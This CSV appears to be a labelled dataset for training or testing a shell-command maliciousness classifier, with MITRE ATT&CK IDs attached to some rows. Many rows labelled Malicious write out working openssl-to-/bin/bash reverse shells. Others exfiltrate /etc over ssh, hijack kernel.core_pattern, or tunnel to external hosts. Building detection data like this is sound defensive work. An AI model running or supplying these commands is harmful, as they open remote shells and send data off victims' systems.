command,label,original_label,mitre_id
openssl s_client -quiet -connect 192.168.1.25:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
macptopbm [-q|-quiet] > path/to/output.pbm,Benign,Benign,Benign
csv-diff path/to/file1.csv path/to/file2.csv --key column_name,Benign,Benign,Benign
sshuttle -r root@172.16.0.25 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
tail -20 /etc/hosts,Context_Dependent,Synthetic,Synthetic
strace -p 8443,Context_Dependent,Synthetic,Synthetic
deborphan [-n|--nice-mode],Benign,Benign,Benign
trash restore file,Benign,Benign,Benign
"ping -i seconds ""host""",Benign,Benign,Benign
sudo loadkeys en|de|fi|dvorak|defkeymap|...,Benign,Benign,Benign
xmlstarlet ls path/to/directory,Benign,Benign,Benign
tcpdump -i eth0 dst 10.0.0.10,Context_Dependent,Synthetic,Synthetic
ngrok http example.com:80,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:80,Malicious,Synthetic,Synthetic
poetry add package_name==version,Benign,Benign,Benign
"find /path/to/dir/* -printf ""%T@|%p|%l"" -exec stat -Lc ""|%Y.0000000000"" {} \;",Benign,Benign,Benign
az lock create [-n|--name] lock_name [-t|--lock-type] ReadOnly,Benign,Benign,Benign
kustomize create --autodetect,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:4445,Malicious,Synthetic,Synthetic
nagios2 -d,Benign,Benign,Benign
iex -S mix,Benign,Benign,Benign
rofi -show drun,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.254:80 root@10.0.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
latexpand --keep-comments [-o|--output] path/to/output.tex path/to/file.tex,Benign,Benign,Benign
Invoke-WebRequest -Headers {{@{ X-My-Header = '123' }}} -Method PUT http://example.com,Benign,Benign,Benign
sudo pvscan,Benign,Benign,Benign
"find . -name ""S1A*1S*SAFE"" | rev | awk -F '/' '{print $1}' | rev | sort -t _ -k 5",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
find Symfony -type f,Benign,Benign,Benign
hatch clean,Benign,Benign,Benign
fish [-N|--no-config],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:8443,Malicious,Synthetic,Synthetic
todo.sh ls,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:4445,Malicious,Synthetic,Synthetic
sonar-scanner [-h|--help],Benign,Benign,Benign
kubeseal --fetch-cert --username username --password password > cert.pem,Benign,Benign,Benign
redshift -g red:green:blue,Benign,Benign,Benign
osv-scanner --skip-git -r|-D target,Benign,Benign,Benign
hg add [-X|--exclude] pattern,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:172.16.5.20:9001 backup@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ListBuckets,Context_Dependent,Malicious,T1580
sgpt --help,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:4445,Malicious,Synthetic,Synthetic
ngs path/to/script.ngs,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.50:143 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
tldr linode-cli volumes,Benign,Benign,Benign
sshare --parsable|parsable2|json|yaml,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9002,Malicious,Synthetic,Synthetic
wlc [-c|--config] path/to/file list-projects,Benign,Benign,Benign
checksec kernel,Benign,Benign,Benign
stdbuf -i0 /bin/sh,Malicious,Malicious,T1059
share -F nfs -o ro /path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
"Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",Context_Dependent,Malicious,T1518
.config,Malicious,Malicious,T1574
alias iTMSTransporter='`xcode-select --print-path`/../Applications/Application\ Loader.app/Contents/MacOS/itms/bin/iTMSTransporter',Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:8443 postgres@target.com,Context_Dependent,Synthetic,Synthetic
tlmgr pinning add repository package1 package2 ...,Benign,Benign,Benign
postgres --shared-buffers=128MB,Benign,Benign,Benign
tldr gh accessibility,Benign,Benign,Benign
"ssh -S ""$SSHSOCKET"" -O exit ""$USER_AT_HOST""",Benign,Benign,Benign
daps [-d|--docconfig] path/to/file.xml pdf,Benign,Benign,Benign
tail -20 /etc/pam.d/common-auth,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
xtrlock -b,Benign,Benign,Benign
appman [-r|remove] package,Benign,Benign,Benign
mktemp -d -t,Benign,Benign,Benign
poweroff,Benign,Benign,Benign
comm <(sort -n f1.txt) <(sort -n f2.txt),Benign,Benign,Benign
nmcli [g|general],Benign,Benign,Benign
spark register token,Benign,Benign,Benign
<Ctrl g><w>,Benign,Benign,Benign
DeviceSync,Malicious,Malicious,T1112
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:4445,Malicious,Synthetic,Synthetic
sudo slabtop,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
{ time sleep 1; } 2>&1 | grep real,Benign,Benign,Benign
nohup php newEmptyPHP.php &,Benign,Benign,Benign
yum install -y nodejs,Benign,Benign,Benign
pystun3 --source-port 7932,Benign,Benign,Benign
jarsigner -verify path/to/file.jar,Benign,Benign,Benign
mu find to:alice subject:jellyfish apples OR oranges,Benign,Benign,Benign
urxvt -cd path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:3306 deploy@10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
meshlabserver -i input.x3d -o output.x3d -s filter_script.mlx -l logfile,Benign,Benign,Benign
"todoist [q|quick] '#project_name ""tmr 9am"" p1 task_name @label_name'",Benign,Benign,Benign
"date ; read -t 10 -p ""Hit ENTER or wait ten seconds"" ; echo ; date",Benign,Benign,Benign
tcpdump -i enp0s3 -c 100,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:5432 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
. torsocks on|off,Benign,Benign,Benign
fusermount -u path/to/mount_point,Benign,Benign,Benign
sshuttle -r support@172.16.5.20 0/0,Context_Dependent,Synthetic,Synthetic
"find /usr /home /tmp -name ""*.jar""",Benign,Benign,Benign
sed '/pattern to match/d' ./infile,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
tldr docker container logs,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8081,Malicious,Synthetic,Synthetic
pueue enqueue task_id task_id,Benign,Benign,Benign
handbrakecli [-z|--preset-list],Benign,Benign,Benign
exa [-l|--long] [-a|--all],Benign,Benign,Benign
lci [-v|--version],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
"ssh $domain ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz",Malicious,Malicious,T1048
"if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi",Context_Dependent,Malicious,T1082
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
systemd-detect-virt [-c|--container],Benign,Benign,Benign
sudo mknod [-Z|--context] path/to/device_file type major_device_number minor_device_number,Benign,Benign,Benign
sport check package,Benign,Benign,Benign
ng [b|build] --clear-screen,Benign,Benign,Benign
hut git|hg list,Benign,Benign,Benign
echo 'fd.close()' >> $python_script_name,Malicious,Malicious,T1059
tcpdump -i eth0,Context_Dependent,Synthetic,Synthetic
"find . -name ""*.trc"" -ctime +3 -exec rm -f {} \;",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
tar cvf - path/to/directory | lz4 - dir.tar.lz4,Benign,Benign,Benign
killall [-i|--interactive] process_name,Benign,Benign,Benign
tee /tmp/arjhaiX4,Benign,Benign,Benign
tail -20 /etc/security/limits.conf,Context_Dependent,Synthetic,Synthetic
networkQuality -v,Benign,Benign,Benign
distrobox-export [-a|--app] package [-d|--delete],Benign,Benign,Benign
brittany path/to/file.hs,Benign,Benign,Benign
psexec \\remote_host ipconfig /all,Benign,Benign,Benign
sysctl 'kernel.core_pattern=|/path/to/command',Malicious,Malicious,T1059
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8888,Malicious,Synthetic,Synthetic
git pull remote_name branch,Benign,Benign,Benign
buku keyword [-t|--stag] privacy,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
paclock --print,Benign,Benign,Benign
git restore path/to/file,Benign,Benign,Benign
"cbt count ""table_name""",Benign,Benign,Benign
df --total | tail -n 1,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:4445,Malicious,Synthetic,Synthetic
ots new -x number_of_hoursh,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:9090,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:80 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
brotli path/to/file [-o|--output] path/to/compressed_output_file.br,Benign,Benign,Benign
sysctl net.ipv4.conf.all.forwarding,Context_Dependent,Synthetic,Synthetic
find $DBA/$ORACLE_SID/bdump/*.trc -mtime +7,Benign,Benign,Benign
"find ""$DIR"" -type f -exec grep ""$SEARCH"" {} \;",Benign,Benign,Benign
sudo tmutil startbackup,Benign,Benign,Benign
lsof -t path/to/file,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:9001,Malicious,Synthetic,Synthetic
stat $target_filename,Malicious,Malicious,T1070
openssl s_client -quiet -connect 192.168.1.254:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9001,Malicious,Synthetic,Synthetic
"sudo apptainer capability add [-g|--group] groupname cap_net_raw,cap_chown,...",Benign,Benign,Benign
systemctl status mysql,Context_Dependent,Synthetic,Synthetic
"sudo tune2fs -o discard,user_xattr /dev/sdXN",Benign,Benign,Benign
find . \( -name '*.txt' -mtime +5 -o -name '*.html' \) -print0,Benign,Benign,Benign
termdown [-z|--time],Benign,Benign,Benign
poetry new path/to/directory --name package_name,Benign,Benign,Benign
idnits --verbose path/to/file.txt,Benign,Benign,Benign
systemctl is-enabled cron,Context_Dependent,Synthetic,Synthetic
tcpdump -i eth0 port 143,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
sshuttle -r support@192.168.0.5 0/0,Context_Dependent,Synthetic,Synthetic
codecrafters test,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
"find . -name ""*.txt"" -exec rm {} +",Benign,Benign,Benign
msxsl.exe {PATH:.xml} {PATH:.xsl},Malicious,Malicious,T1220
cypher-shell --log path/to/file.log,Benign,Benign,Benign
clusters:,Malicious,Malicious,T1059
psysh [-c|--config] path/to/file,Benign,Benign,Benign
find * -maxdepth 0 ! -path . -exec mv {} PRE_{} \;,Benign,Benign,Benign
ilbmtoppm [-m|-maskfile] path/to/maskfile.pbm path/to/file.ilbm > path/to/file.ppm,Benign,Benign,Benign
"echo ""a,b""|sed 's/,/\r\n/'",Benign,Benign,Benign
tail -20 /etc/profile,Context_Dependent,Synthetic,Synthetic
sshuttle -r support@10.0.0.25 0/0,Context_Dependent,Synthetic,Synthetic
sc.exe start $service_name,Malicious,Malicious,T1543
qm [shu|shutdown] --timeout 10 VM_ID,Benign,Benign,Benign
find /var/spool -mtime +60,Benign,Benign,Benign
uuidparse uuid1 uuid2 ...,Benign,Benign,Benign
"mimikatz ""crypto::capi""",Benign,Benign,Benign
sudo find . -print0,Benign,Benign,Benign
portablectl is-attached path/to/image|image_name,Benign,Benign,Benign
RECYCLE.BIN,Malicious,Malicious,T1564
googler [-w|--site] site keyword,Benign,Benign,Benign
"sqlite-utils query path/to/database.db ""delete from table_name where name = 'Tony Hoare'""",Benign,Benign,Benign
cli53 [rc|rrcreate] example.com 'www 300 A 150.130.110.1',Benign,Benign,Benign
pueue reset [-f|--force],Benign,Benign,Benign
ldc2 -h,Benign,Benign,Benign
swupd check-update,Benign,Benign,Benign
tcpdump -i wlan0 port 143,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:3306 operator@support.internal,Context_Dependent,Synthetic,Synthetic
xed --create path/to/file1 path/to/file2 ...,Benign,Benign,Benign
sshuttle -r operator@staging.lab 192.168.1.100/24,Context_Dependent,Synthetic,Synthetic
fping [-a|--alive] [-g|--generate] 192.168.1.0/24,Benign,Benign,Benign
orca-c --initial-size columnsxrows,Benign,Benign,Benign
afplay --rate 2 path/to/file,Benign,Benign,Benign
npm [c|config] set key value,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:80 backup@192.168.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
tlmgr restore package,Benign,Benign,Benign
cat input_file | httprobe,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:3389,Malicious,Synthetic,Synthetic
sshuttle -r audit@10.0.0.100 192.168.1.25/24,Context_Dependent,Synthetic,Synthetic
systemctl list-paths --state state,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
find . -name __temp__* -exec rm -rf '{}' \;,Benign,Benign,Benign
systemctl switch-root path/to/new_root /sbin/init,Benign,Benign,Benign
spotdl save open.spotify.com/playlist/playlistId1 open.spotify.com/track/trackId2 ... --save-file path/to/save_file.spotdl,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
./path/to/binary -t,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:4445,Malicious,Synthetic,Synthetic
espanso edit config,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:9090,Malicious,Synthetic,Synthetic
